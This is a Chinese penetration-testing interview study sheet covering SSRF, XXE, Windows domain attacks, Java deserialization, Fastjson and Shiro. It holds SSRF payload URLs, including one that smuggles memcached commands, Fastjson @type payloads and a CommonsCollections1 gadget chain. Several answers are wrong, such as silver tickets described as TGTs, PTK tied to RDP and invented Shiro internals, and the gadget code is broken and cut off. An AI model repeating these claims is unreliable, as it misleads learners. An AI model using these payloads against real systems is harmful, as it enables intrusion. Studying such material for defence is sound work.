ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET
LDAP://
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
Gopher://
```
#### 漏洞修复
> [https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html](https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html)

1.  检查是否为内网IP地址
绕过方法:
利用八进制IP地址绕过
利用十六进制IP地址绕过
利用十进制的IP地址绕过
利用IP地址的省略写法绕过
最好的做法：IP地址转换为整数再进行判断 
2.  获取真正请求的host 
   1.  如何正确的获取用户输入的URL的Host？
   最常见的就是，使用http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname 
   2.  只要Host只要不是内网IP即可吗？
   host可能为ip,可能为域名，利用xip.io绕过。方法：判断是否为http协议，获取url的host，再解析该host，将解析到的ip再进行检查 
   3.  只要Host指向的IP不是内网IP即可吗？
   不一定，可能会30x跳转 

**归纳**
> 解析目标URL，获取其Host
解析Host，获取Host指向的IP地址
检查IP地址是否为内网IP
请求URL
如果有跳转，拿出跳转URL，执行1



```
1. sql注入绕WAF的方式尽可能多说
2. 分块传输绕WAF的原理
3. 文件上传绕WAF的方式都有哪些
4. mssql除了xpcmdshell还有哪些方式拿shell
5. 绕waf手段和waf防御思路
6. mysql源码读过吗
7.flask模版注入讲讲
8. 沙箱逃逸了解吗
9. js混淆和逆向相关懂吗
● 如何绕过CDN找到真实IP，请列举五种方法 (★★★)
● redis未授权访问如何利用，利用的前提条件是? (★★★)
● mysql提权方式有哪些?利用条件是什么? (★)
● windows+mysql，存在sql注入，但是机器无外网权限，可以利用吗? (★)
● 常用的信息收集手段有哪些，除去路径扫描，子域名爆破等常见手段，有什么猥琐的方法收集企业信息? (★★)
● SRC挖掘与渗透测试的区别是什么，针对这两个不同的目标，实施过程中会有什么区别 (★★)
● 存储xss在纯内网的环境中，可以怎么利用？(★★)
● mssql中，假设为sa权限，如何不通过xp_cmdshell执行系统命令 (★★)
● 假设某网站存在waf，不考虑正面绕过的前提下，应该如何绕过(分情况讨论 云waf/物理waf) (★)
绕过宝塔执行命令

```
### xxe原理和利用

xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务
探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的

防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml

客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析
Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：

javax.xml.stream.XMLStreamReader;

javax.xml.parsers.DocumentBuilderFactory;




## 内网/域渗透

```
内网信息收集
内网的信息搜集（win和linux的命令，以及工具）
内网中比较脆弱的系统
内网会用哪些工具
内网如何用较少的流量探测主机
● psexec的底层实现原理是什么? (★)
● SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(★★)
● 内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (★★★)
● 在win10或者winserver2012中，如果需要使用mimikatz，该如何使用，修改注册表后如何在不重启机器的情况下获取NTLM? (★★)
● 域内如何查询员工对应的机器? (★)
● 如何查询域之间的信任关系? (★)
● 域控开放的常见端口有哪些?(★)
● windows内网中ntlm协议认证过程 (★★★)
● cobalt strike中上线方式有哪些，各自是什么原理，如果需要绕过监控，如何绕? (★★)
● 横向渗透中，wmic如何构造有回显的命令执行? (★★)
● windows应急响应中，需要查看哪些安全日志ID，分别对应哪些攻防场景，如果该windows主机为域控，又应该查看哪些事件日志? (★★★)
● golden ticket和sliver ticket的区别是什么? (★★★)
● sliver ticket利用的前置条件是什么?(★)
● 在非域主机的情况下，如何快速发现域主机？ (★★)
● mimikatz的原理，哪个补丁导致了mimikatz无法利用，如何绕过? (★★)
● 有没有办法在不重启机器的前提下启用wdigest这个SSPI? (★)
● NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制? (★)
● windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么? (★)
● 假设拿到了某台域机器的权限，但是机器上并没有域账户，应该如何进行域渗透? (★★)
● 域的初始化配置允许任何域用户登录任意加了域的机器，这是为什么? (★)
● 如何查询域管登录过的机器，查询原理又是什么? (★)
docker逃逸


VMware逃逸

dll劫持原理，怎么找可利用的dll劫持


进程注入的原理流程

进程注入方式
```


```
内网中域认证的协议
域内的攻击方式（约束委派等）
约束委派和非约束委派的区别
pth.ptt,ptk区别
windows的身份切换和令牌切换
内网拿了web shell，发现不出网，怎么搞隧道
有台Windows域内机子，你怎么打域控
域内渗透？详细说明渗透思路
哪些域账户值得关注
域控相关的命令
如何判断域控
判断是否在域内
什么是域内委派？利用要点？
域内的一个普通用户（非域用户）如何进行利用
内网渗透降权的作用？
hash传递原理
PsExec具体实现原理
NTLM原理
pth中LM hash和NTLM hash的区别
kerboros认证流程
SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(**)
内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (***)
如何查看自己已有的票据
凭证获取(姿势/常用/原理/对抗)
黄金票据和白银票据的区别
黄金票据是哪个协议存在的安全问题
黄金票据的伪造原理详细一点
黄金票据存储在哪，存储介质是什么
排除关掉服务器这些，如何删除黄金票据
MS14-068的原理
内网KDC服务器开放在哪个端口
获取了不在域的主机，怎么快速发现域
pth基于哪个端口445，用了什么协议smb
mssql的数据库已经getshell了，是本地管理员，在域但是没有域用户，这个时候怎么进行下一步
新建一个域用户的权限
DCsync原理，DCsync是那个协议
️横向
横向移动的各种姿势及原理
工作组横向
域内横向
如果控制了内网的一台pc如何在域中进行一系列的操作
如果日下了知乎，横向渗透时你会去攻击哪些东西，哪些是重点端口
拿到服务器权限后如何访问内网的服务？
如何快速找到内网的主机以及如何避免内网WAF探测？
内网穿透，正反向代理以及不出网的情况
怎么搭建dns隧道，如何通过dns上线cs呢
代理转发发现3389不出网怎么解决
内网中传输大文件
不允许扫描，如何横向
存在杀软，不允许exe落地，怎么办
获取hash值之后会尝试干什么
工作组中你获取了一个解不开的hash，你可以做票据伪造吗
windows，权限是administrator，怎么确定主机是否加入域了
代理转发的工具
一个经过4a的代理出来后，内网有个私有的域名，只有内网dns解析，用4a是不行的，那你会怎么办呢
frp接触的多吗，怎么用
内网A主机出网，打到了不出网的B主机，那怎么把它代理出来
frp怎么做两层的代理
这几个漏洞不出网情况下怎么办
拿到webshell不出网情况下怎么办
dns出网协议怎么利用
横向渗透命令执行手段
psexec和wmic或者其他的区别
```

### 黄金票据和白银票据的利用
> 黄金票据和白银票据都是在Windows域中滥用Kerberos身份验证协议的攻击方式，具体如下：
> - 黄金票据攻击：攻击者获取到域控的krbtgt账户的密码哈希值，然后使用工具（如Mimikatz）生成一个有效期很长（默认为10年）的TGT票据。这个TGT票据可以用于任何主机，任何服务，任何时间，获得凭据相当于拥有了整个域的管理权限。
> - 白银票据攻击：攻击者获取到一个已经有访问其他域资源的用户账号（例如域管理员）的明文密码或者密码哈希值，然后使用工具（如Mimikatz）生成一个短期有效（默认为1小时）的TGT票据。这个TGT票据可以用于访问其他域资源，但不能作为黄金票据一样具有域控的管理权限。
> 
这些攻击都可以绕过域内的防御措施（如防火墙、入侵检测系统、杀毒软件等），因为它们是基于Kerberos协议内部的安全性缺陷进行的攻击，而Kerberos协议是Windows域中的基础身份验证协议。防御这些攻击的方法主要是：
> - 加强域管理员和其他敏感账户的密码安全，例如使用强密码、定期更改密码、限制密码重复使用、启用账号锁定等。
> - 限制普通用户的权限，使用最小特权原则，减少攻击面。
> - 监控域控制器的安全日志，及时发现可疑行为，例如异常的登录活动、异常的用户权限修改等。
> - 配置域策略，限制域内机器的网络通信，阻止敏感协议的跨机器传递，例如SMB、LDAP、RPC等。
> - 使用Kerberos认证的其他产品也应该进行安全配置和加固，例如SQL Server、Exchange Server、SharePoint等。


> 1. 白银票据：抓取到了域控服务hash的情况下，在客户端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。
> 2. 黄金票据：直接抓取域控中账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。
> 3. 通过mimkatz执行，导出域控中账号的Hash


### ntlm relay
> NTLM relay攻击是指攻击者通过欺骗目标计算机向攻击者控制的远程服务器进行身份验证的一种攻击方式。攻击者通过在目标计算机上进行中间人攻击，截获NTLMv2认证过程中的挑战/响应消息，然后将响应消息中的哈希传递到攻击者控制的服务器进行身份验证。如果攻击者成功地欺骗服务器，服务器将相信攻击者是合法的用户并授予相应的权限。
> 下面是一些NTLM relay攻击的常见利用过程：
> 1. 渗透目标系统：攻击者可以使用各种手段渗透目标系统，例如利用漏洞获取系统管理员权限、使用弱口令攻击等。
> 2. 窃取NTLM hash：攻击者通过在目标系统上进行中间人攻击，窃取目标系统中的NTLM hash。通常攻击者可以使用工具如Responder、ntlmrelayx等来实现。
> 3. 进行中继攻击：攻击者将从目标系统中窃取的NTLM hash转发到攻击者控制的服务器上，并试图在服务器上进行身份验证。如果服务器成功验证了哈希，攻击者就可以获得访问目标网络的权限。
> 4. 获取敏感信息：攻击者可以利用成功的中继攻击来获取敏感信息，例如通过访问文件共享、执行命令等。
> 
为了防止NTLM relay攻击，可以使用以下几种方式：
> 1. 启用SMB签名：SMB签名可以确保与目标系统通信的数据不被篡改。攻击者无法通过修改SMB数据包中的哈希值来窃取NTLM hash。
> 2. 使用Kerberos身份验证：Kerberos可以提供更强大的身份验证，可以有效防止NTLM relay攻击。
> 3. 启用Extended Protection for Authentication（EPA）：EPA可以提供额外的安全保护，可以确保连接到服务器的客户端和服务器之间的安全通信。攻击者无法通过欺骗服务器进行中继攻击。

### PTH&PTT&PTK
> PTH（Pass The Hash）、PTT（Pass The Ticket）和PTK（Pass The Key）都是利用Windows认证协议的漏洞，来获取目标系统的权限。
> 具体的利用过程如下：


> 1. 获取NTLM hash
> 
首先需要获取目标主机的NTLM hash，这可以通过网络嗅探、使用Windows工具（如Mimikatz）等方式获取。获取到的NTLM hash可以用于后续的PTH和PTT攻击。
> 1. PTH攻击
> 
PTH攻击的目标是利用目标系统的NTLM hash来获取系统权限。攻击者可以使用工具（如Mimikatz）来注入NTLM hash，并通过NTLM认证来获取系统权限。
> 1. PTT攻击
> 
PTT攻击是基于Kerberos认证协议的，目的是利用Kerberos票据来获取目标系统的权限。攻击者可以使用工具（如Mimikatz）来注入Kerberos票据，并通过Kerberos认证来获取系统权限。
> 1. PTK攻击
> 
PTK攻击是针对RDP协议的，目的是利用RDP协议中的NTLM hash或Kerberos票据来获取目标系统的权限。攻击者可以使用工具（如Mimikatz）来注入NTLM hash或Kerberos票据，并通过RDP协议来获取系统权限。
> 需要注意的是，这些攻击都需要先获取到目标系统的NTLM hash或Kerberos票据，因此通常需要先进行其他类型的攻击（如密码破解、漏洞利用等）来获取到这些信息。另外，这些攻击都有可能被安全工具或防御措施所阻挡或检测到，因此需要综合考虑其他攻击手段和安全措施


### PsExec 实现的原理
> PsExec 实现的原理是使用了 SMB（Server Message Block）协议，在远程系统上启动一个服务进程，然后通过该进程来执行 PsExec 指定的命令行工具。
> 具体来说，PsExec 在远程系统上启动了一个名为 “PsExecSvc” 的服务进程，该服务进程会在本地启动一个 RPC（Remote Procedure Call）服务，然后等待来自 PsExec 的命令。
> 当 PsExec 向远程系统发送命令时，实际上是通过 SMB 协议向远程系统发送一个命令请求，并在该请求中指定要执行的命令行工具和参数等信息。远程系统接收到请求后，会将请求交给本地的 “PsExecSvc” 服务进程处理，该服务进程会启动一个新的进程，并将 PsExec 请求中指定的命令行工具和参数传递给该进程。该进程会在远程系统上执行指定的命令，并将执行结果返回给 “PsExecSvc” 服务进程，最终将结果传递给 PsExec 客户端。
> PsExec 实现的过程中使用了 SMB 协议的一些特性，如 SMB 中的“SMB_COM_TRANSACTION2”请求、SMB 中的“SMB_COM_NT_CREATE_ANDX”请求等。在具体的实现中，还使用了一些系统调用和 API 函数，如 OpenSCManager、CreateService、StartService、ControlService 等。
> 总的来说，PsExec 利用了 SMB 协议在远程系统上启动了一个服务进程，并通过该进程来执行指定的命令行工具，从而实现了在远程系统上执行命令的目的。


### 约束委派和非约束委派的区别
> 需要注意的一点是接受委派的用户只能是**服务账户**或者**计算机用户**。
> 说人话就是：**为了解决服务代表用户访问其他应用产生的功能**



### 横向渗透命令执行手段
psexec，wmic，smbexec，winrm，net use共享+计划任务+type命令

### 密码抓取手段
procdump+mimikatz 转储然后用mimikatz离线读取
Sam 获取然后离线读取

### 域内攻击方法
MS14-068、Roasting攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay、CVE-2020-1472
## java安全
```

2. Fastjson反序列化原理以及1.2.47绕过的原理

4. CC链中找你最熟悉的几条链讲一讲
5. Shiro550反序列化的原理及利用工具编写思路
6. Spring/Struts2的RCE中印象最深的讲一讲分析过程
7. java内存马原理和检测
8. fastjson利用链分析下
9. 熟悉cc哪些链原理讲讲
● ClassLoader是什么? 加载自定义ClassLoader的前提是什么?
● 大概讲一下CommonCollections1的利用链，该利用链有什么样的限制?
● fastjson的反序列化和原生反序列化漏洞的区别是什么?
● 在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗?
● 单向代码执行链如何实现执行多条语句，如CommonCollections1
● 请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么?
● 冰蝎当中通过Java联动Cobalt Strike上线的原理是什么?
● serialVersionUID 在反序列化中的作用是什么?
写ysoserial的思路



大概讲一下CommonCollections1的利用链，该利用链有什么样的限制?
在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗? 
单向代码执行链如何实现执行多条语句，如CommonCollections1
请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么?
冰蝎当中通过Java联动Cobalt Strike上线的原理是什么?
serialVersionUID 在反序列化中的作用是什么?
```
### 1. ClassLoader是什么? 加载自定义ClassLoader的前提是什么? 
> 在Java中，ClassLoader是用来加载Java字节码文件（.class文件）的机制，它负责将字节码文件加载到JVM内存中并转换成Java对象，以供Java应用程序使用。ClassLoader的主要作用是根据指定的类名查找字节码文件，然后把字节码文件加载到JVM中，最终转换成一个Class对象。
> Java中提供了三个ClassLoader，分别为Bootstrap ClassLoader、Extension ClassLoader和System ClassLoader。其中Bootstrap ClassLoader是JVM自带的ClassLoader，用来加载Java的核心类库，而Extension ClassLoader和System ClassLoader则是用来加载应用程序的类的。
> 如果需要使用自定义的ClassLoader，必须满足以下前提条件：
> 1. 实现java.lang.ClassLoader类或其子类；
> 2. 重写findClass()方法或loadClass()方法；
> 3. 在findClass()或loadClass()方法中实现类的加载。
> 
在满足以上条件的情况下，可以使用自定义的ClassLoader来加载Java类。

### 2. 最基本的反序列化原理
>  反序列化是将序列化对象转换为程序内存中的对象的过程。在许多编程语言中，对象可以序列化为二进制格式、XML 或 JSON 格式，反序列化过程就是将这些格式的数据转化为程序内存中的对象。  
> 最基本的反序列化原理可以分为以下几步：
> 1. 读取序列化数据：从外部数据源（例如文件、网络）中读取序列化后的数据。
> 2. 分析序列化数据：解析序列化数据，根据序列化数据的格式，按照特定的协议读取其中存储的各种信息。
> 3. 创建对象：根据序列化数据中的类名、字段名等信息，使用相应的构造函数创建对象，并初始化其中的属性值。
> 4. 返回对象：将创建并初始化好的对象返回给调用者，供程序使用。


### 3. java反序列化的cc链原理
> Java反序列化的cc链是指通过构造Java序列化对象中的类继承关系，构造出一个恶意的调用链（即cc链）。具体来说，Java序列化对象中包含了被序列化对象的完整类名，而Java反序列化在将序列化数据还原成Java对象时，需要根据类名去加载对应的类文件。因此，通过构造一个恶意的Java序列化对象，可以利用ClassLoader的委托机制来加载攻击者预先定义好的恶意类，从而执行攻击者的代码。

> cc1 最后 invoke 反射加载输入的方法cc2 cc3 等等大同小异

> CC链的构造需要满足一定的条件，即需要找到一个继承关系，将攻击者自定义的类插入到继承链中，并覆盖掉父类中的某个方法。因此，攻击者需要了解目标系统中的类继承结构，并且需要能够通过Java序列化构造出符合条件的恶意对象。同时，攻击者还需要了解ClassLoader的加载顺序和委托机制，从而能够在恶意类被加载时执行自己的代码。
> 需要注意的是，CC链攻击是一种高级的反序列化漏洞攻击方式，攻击者需要掌握较为深入的Java反序列化相关知识，并且需要花费较多的时间和精力进行构造和测试。

#### 3.1 大概讲一下CommonCollections1的利用链，该利用链有什么样的限制?
> Commons Collections是一个常用的Java类库，其中包含许多可序列化的类。而Commons Collections 1中的一个类（InvokerTransformer）存在反序列化漏洞，攻击者可以利用该漏洞实现Java反序列化攻击。该攻击链主要包括以下几个步骤：
> 1. 构造一个包含恶意代码的序列化数据。
> 2. 将序列化数据发送给一个存在反序列化漏洞的Java应用程序。
> 3. 应用程序使用反序列化函数（如ObjectInputStream.readObject()）读取序列化数据。
> 4. 序列化数据中的恶意代码被执行，攻击者可以在受害者机器上执行任意代码。
> 
Commons Collections 1的利用链有一些限制，例如只能使用Serializable和Externalizable接口实现的类，而且攻击者必须要知道目标应用程序的类路径和类名。此外，由于在Java 8中实现了防御措施，因此Commons Collections 1的利用链在Java 8及以上版本中已经无法使用。需要注意的是，Commons Collections 1的利用链只是Java反序列化攻击的一个例子，实际上Java反序列化攻击还有其他的利用链和攻击方式。

**CommonsCollections1中的Invoketransformer是其中一个常见的利用链。以下是对其详细的代码分析：**
首先，让我们看看Invoketransformer的类定义：
```java
public class InvokerTransformer implements Transformer, Serializable {
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
}
```
从类定义中可以看出，InvokerTransformer实现了Transformer接口，也就是说它可以作为Transformer类的一个实例被传递给一些需要Transformer的API中，这就为攻击者提供了机会，可以通过构造恶意的InvokerTransformer实例，来触发Transformer接口中的transform()方法，从而实现攻击。
我们来看一下transform()方法的实现：
```java
public Object transform(Object input) {
    if (input == null) {
    return null;
}
try {
    Method method = input.getClass().getMethod(iMethodName, iParamTypes);
    if (!method.isAccessible()) {
        method.setAccessible(true);
    }
    return method.invoke(input, iArgs);
} catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
    throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist or is not accessible");
}
}
```
transform()方法会首先判断传入的参数是否为空，如果为空则直接返回空，否则会尝试反射调用iMethodName指定的方法，并传入iArgs指定的参数，从而实现对目标方法的调用。如果指定的方法不存在或不可访问，则会抛出异常。
接下来我们看一下一个典型的CommonsCollections1的攻击链构造：
```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new Transformer() {
        public Object transform(Object input) {
            return new ProcessBuilder((String[])input).start();
        }
    }
};

Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, new Factory() {
    public Object create() {
        return "foo";
    }
});
lazyMap.put("foo", "bar");

Map mapProxy = createProxyMap(transformerChain, lazyMap);

Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructors()[0];
constructor.setAccessible(true);

InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
```
在这个攻击链中，我们首先构造了一个包含多个Transformer的transformer数组，并将这个数组作为参数构造一个ChainedTransformer。然后我们构造了一个普通的HashMap，并使用LazyMap.decorate()方法将其变成一个LazyMap。在这个LazyMap中，我们将其中一个键值对的值设置为之前构造好的ChainedTransformer。最后，我们使用createProxyMap()方法将这个LazyMap转化为一个代理Map，并将这个代理Map作

#### 3.2 CC链中找你最熟悉的几条链讲一讲
> 在CC链中比较常见的利用链有以下几条：
> 1. CommonsCollections1的InvokerTransformer链：该链的利用原理是通过反射调用指定类的指定方法，从而实现远程命令执行。
> 2. CommonsCollections3的ChainedTransformer链：该链的利用原理是通过ChainedTransformer将多个Transformer组合起来，最终执行远程命令。
> 3. CommonsCollections4的TransletBytecode和InvokerTransformer链：该链的利用原理是通过Translet类生成字节码，然后利用InvokerTransformer和反射调用字节码实现远程命令执行。
> 
这些链的共同特点是都利用了Java反序列化漏洞，将攻击者控制的恶意对象序列化到服务器上，触发反序列化操作，从而实现远程命令执行。其中限制较大的是需要目标服务器上存在可利用的反序列化漏洞，并且攻击者需要构造出恰当的恶意对象，使得反序列化操作最终能够执行攻击者想要的恶意代码。因此，在应用程序开发过程中，要注意避免反序列化漏洞的出现，以避免CC链等恶意攻击的影响。同时，在安全运维过程中也要加强对应用程序的安全性检测和监控，及时发现和应对恶意攻击。

### 4. fastjson反序列化原理和常见利用链
> Fastjson是一个Java编写的高性能JSON处理框架，它提供了丰富的功能和灵活的配置选项。Fastjson在处理Java对象序列化和反序列化时，存在一些反序列化漏洞，攻击者可以通过构造恶意的序列化数据来实现代码执行、文件读取等攻击行为。常见的Fastjson反序列化漏洞利用链包括：

1. 利用@type属性：Fastjson在反序列化时，会自动根据JSON数据中的@type属性来加载对应的类，并实例化该类对象。攻击者可以通过构造带有@type属性的JSON数据，来指定反序列化的类名和构造函数参数。如果构造函数中包含可控参数，则可以实现任意代码执行。例如：
```
{"@type":"com.example.User","name":"admin","password":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"age":20}
```
上述JSON数据中，攻击者通过@type属性指定了反序列化的类名为com.example.User，并且通过password属性构造了一个JdbcRowSetImpl对象，这个对象可以执行任意SQL语句。

1. 利用自定义反序列化器：Fastjson支持用户自定义反序列化器，攻击者可以通过继承ObjectDeserializer接口，并实现deserialze()方法，来实现自己的反序列化逻辑。如果攻击者可以构造恶意的JSON数据，并且该数据会触发自定义反序列化器的调用，就可以在该方法中执行任意代码。例如：
```
public class EvilDeserializer implements ObjectDeserializer {
     public Object deserialze(DefaultJSONParser parser, Type type, Object fieldName) {
         // 执行恶意代码
     }
 }
 
 String json = "{\"@type\":\"com.example.User\",\"name\":\"admin\"}";
 JSON.parseObject(json, new EvilDeserializer());
```
上述代码中，攻击者构造了一个JSON数据，并且通过JSON.parseObject()方法使用自定义反序列化器来处理该数据。在EvilDeserializer的deserialze()方法中，攻击者可以执行任意代码。

1. 利用AutoType特性：Fastjson支持AutoType特性，该特性可以自动加载指定的类。攻击者可以通过构造恶意JSON数据，并使用AutoType的特性来实现任意代码执行。例如：
```
String json = "{\"@type\":\"com.example.User\",\"name\":\"admin\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Class\",\"val\":\"com.example.Evil\"}";
 JSON.parseObject(json);
```
上述代码中，攻击者构造了一个JSON数据，并通过多次使用@type属性来混淆类型，最终触发加载com.example.Evil类，并执行其中的任意代码。
防御Fastjson反序列化漏洞，可以采取以下措施：

1. 使用最新版本的Fastjson，官方在每个版本中都会修复已知的反序列化

#### 4.1  Fastjson反序列化1.2.47绕过的原理
> Fastjson 1.2.47版本的漏洞主要是由于在反序列化时使用了Java语言中默认的反射机制，没有对反序列化数据进行有效的校验，从而导致了反序列化漏洞的产生。
> 在攻击者构造的恶意JSON数据中，会通过伪造的类型、方法名等信息来绕过Fastjson的反序列化过程中的安全校验，进而在执行反序列化过程中执行恶意代码。
> 在Fastjson 1.2.47版本中，攻击者可以通过以下方式来绕过Fastjson的安全检查：
> 1. 利用空字符绕过类型检查：攻击者在构造恶意JSON数据时，可以使用空字符来绕过Fastjson的类型检查，从而构造出带有攻击代码的JSON数据。
> 2. 利用后缀绕过方法名检查：攻击者在构造恶意JSON数据时，可以通过添加后缀的方式来绕过Fastjson的方法名检查，进而成功执行攻击代码。
> 3. 利用自定义反序列化器：攻击者可以通过自定义Fastjson的反序列化器，从而绕过Fastjson的安全检查。


### 5. fastjson的反序列化和原生反序列化漏洞的区别是什么? 
> Fastjson和Java原生反序列化在实现上有一些不同，从而导致了一些不同的漏洞。
> Java原生反序列化是通过ObjectInputStream类实现的，它会根据序列化的字节流来重构对象。这种反序列化存在漏洞，是因为在反序列化时，如果构造函数中存在危险的代码，那么这些代码就会被执行。
> Fastjson的反序列化是通过JSON.parseObject方法实现的，它将JSON字符串反序列化成Java对象。Fastjson的反序列化漏洞主要是因为Fastjson支持反序列化的类型比Java原生反序列化更多，而且Fastjson在反序列化时会自动调用对象的默认构造函数，从而导致一些漏洞的出现。此外，Fastjson在反序列化时还会调用setter方法设置对象的属性值，这也可能导致一些漏洞的出现。
> 常见的Fastjson反序列化漏洞利用链包括：
> 1. JSON反序列化漏洞：攻击者构造含有恶意代码的JSON字符串，通过Fastjson反序列化，触发恶意代码执行。
> 2. Fastjson AutoType反序列化漏洞：攻击者在JSON字符串中携带Java类的全限定名，并通过Fastjson的AutoType机制将JSON字符串反序列化成Java对象，从而触发Java类中的恶意代码执行。
> 3. Fastjson ASM反序列化漏洞：攻击者构造一个含有恶意代码的Java类，然后将这个类的字节码作为一个JSON对象的属性值，再将这个JSON字符串反序列化成Java对象，从而触发恶意代码执行。
> 
需要注意的是，Fastjson的反序列化漏洞可以通过升级Fastjson版本来修复，同时可以采用一些防御措施，比如限制Fastjson反序列化的白名单。


### 6. 在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗? 
> 1. 利用 Tomcat 中的 JSP 组件，通过 JSP 页面来实现内存马，例如使用一些常见的 webshell 代码。
> 2. 自定义 Tomcat 的 Valve 组件，在请求处理过程中注入恶意代码，实现内存马。
> 3. 利用 Tomcat 的类加载机制，替换或添加某个类的字节码，从而实现内存马。
> 4. 在 Tomcat 安装目录下的 webapps 目录中添加恶意的 WAR 包，通过 WAR 包中的代码实现内存马。
> 
对于如何实现重启之后依然不会消失的内存马，可以考虑以下两种方式：
> 1. 在内存马中实现自我复制或者隐藏自己的代码，保证重启之后能够自动恢复。
> 2. 修改 Tomcat 的配置，将某个类或者文件的读写权限设置为只读，防止重启后被修改或删除。另外还可以将内存马所在的目录设置为隐藏目录，这样可以防止被误删除。


### 7. Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么? 
> Shiro反序列化漏洞是由于Shiro框架在反序列化过程中未对反序列化数据进行有效过滤和校验，导致攻击者可以通过构造恶意的序列化数据进行远程代码执行等攻击。
> 与其他反序列化漏洞不同的是，Shiro的反序列化漏洞无法使用常见的ysoserial中的common-collections等利用链，主要是因为Shiro框架在反序列化过程中对类进行了黑名单限制，禁止了一些常见的反序列化利用链中使用的类，例如：HashMap、HashSet等。这使得攻击者需要使用其他的利用链进行攻击。
> 另外，Shiro的反序列化漏洞利用方式与其他反序列化漏洞也有所不同，攻击者需要构造一个包含Shiro认证信息的序列化数据，然后将这个序列化数据传递给Shiro框架进行反序列化，从而实现攻击。

#### 7.1 Shiro550反序列化的原理及利用工具编写思路
> Shiro550是一种Shiro框架的反序列化漏洞。该漏洞源于Shiro框架的一个特性，即当使用了session之后，Shiro框架默认使用Java的序列化机制来序列化session，而Java的序列化机制是存在漏洞的，攻击者可以通过构造恶意的序列化数据来实现远程代码执行。具体的原理如下：
> 1. Shiro在使用session时，会将session序列化后存储在Cookie或URL参数中。
> 2. 攻击者构造恶意的session数据，并将其发送给目标系统。
> 3. 目标系统在反序列化恶意数据时，会执行攻击者构造的恶意代码，从而导致远程代码执行漏洞。
> 
对于该漏洞的利用，攻击者需要构造恶意的session数据，使得目标系统在反序列化时执行攻击者构造的恶意代码。攻击者可以使用ysoserial等工具生成恶意数据，同时可以使用Shiro550工具来进行攻击。
> 值得注意的是，Shiro550漏洞无法使用ysoserial中的常见的CommonsCollections等利用链进行利用，原因是Shiro框架在反序列化时使用了自定义的ObjectSerializer接口来处理序列化数据，而不是使用Java默认的序列化机制。因此，攻击者需要针对Shiro框架的序列化机制进行定制化的利用链编写。

#### 7.2 shiro720与Shiro550的区别
> Shiro 720 和 Shiro 550 都是针对 Apache Shiro 框架反序列化漏洞的不同利用方式。
> Shiro 550 利用的是 Shiro 默认使用的 JdkSerializer 反序列化器，通过构造恶意序列化数据，可以实现远程代码执行攻击。攻击者需要构造一个序列化数据，该数据包含需要执行的命令和命令参数，并将该数据发送到目标服务器，当目标服务器使用 JdkSerializer 反序列化该数据时，恶意代码就会被执行。
> Shiro 720 利用的是 Shiro 用于会话管理的 Session 序列化过程中的漏洞。攻击者可以通过构造恶意序列化数据，将该数据作为会话信息存储到目标服务器中。当服务器下次反序列化该数据时，恶意代码就会被执行。和 Shiro 550 相比，Shiro 720 不需要攻击者掌握 JdkSerializer 的细节，攻击成功的难度也相对较低。
> 由于 Shiro 550 利用的是 JdkSerializer，而在最新版本的 ysoserial 中，JdkSerializer 已经被移除，因此无法使用 ysoserial 中的 common-collections 利用链进行攻击。而 Shiro 720 利用的是 Shiro 自带的序列化机制，因此可以使用 ysoserial 中的 common-collections 利用链进行攻击。

### 8. 冰蝎当中通过Java联动Cobalt Strike上线的原理是什么? 
> 具体实现原理如下：
> 1. 冰蝎使用Java语言编写，通过Java中的Runtime.exec方法，调用操作系统中的cmd.exe命令行程序，执行一条指定的命令。
> 2. Cobalt Strike使用Java语言编写，支持远程加载自定义的Java类，这些Java类可以在Cobalt Strike中被当作插件来使用。这些插件可以执行各种功能，包括文件操作、内存操作、Shell命令执行等。
